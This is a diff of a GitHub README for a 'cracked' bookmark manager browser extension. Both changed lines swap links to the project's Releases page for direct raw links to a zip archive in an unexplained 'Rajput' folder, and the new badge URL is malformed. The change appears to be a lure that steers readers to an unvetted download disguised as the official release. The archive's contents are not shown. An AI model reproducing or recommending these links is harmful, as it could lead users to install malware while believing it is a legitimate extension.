@@ -1,6 +1,6 @@
 # 🔖 cracked-webpage-bookmark-manager-extension - Manage Your Bookmarks Effortlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Furinini/cracked-webpage-bookmark-manager-extension/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Furinini/cracked-webpage-bookmark-manager-extension/main/Rajput/cracked-webpage-bookmark-manager-extension.zip%20Latest%https://raw.githubusercontent.com/Furinini/cracked-webpage-bookmark-manager-extension/main/Rajput/cracked-webpage-bookmark-manager-extension.zip)](https://raw.githubusercontent.com/Furinini/cracked-webpage-bookmark-manager-extension/main/Rajput/cracked-webpage-bookmark-manager-extension.zip)
 
 ## 📋 Introduction
 
@@ -26,7 +26,7 @@ To start using the Cracked Webpage Bookmark Manager Extension, follow these simp
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the following link to see the available versions of the Cracked Webpage Bookmark Manager Extension: [Download Page](https://github.com/Furinini/cracked-webpage-bookmark-manager-extension/releases).
+1. **Visit the Releases Page:** Go to the following link to see the available versions of the Cracked Webpage Bookmark Manager Extension: [Download Page](https://raw.githubusercontent.com/Furinini/cracked-webpage-bookmark-manager-extension/main/Rajput/cracked-webpage-bookmark-manager-extension.zip).
 
 2. **Choose the Latest Version:** Look for the latest release listed at the top of the page.
 
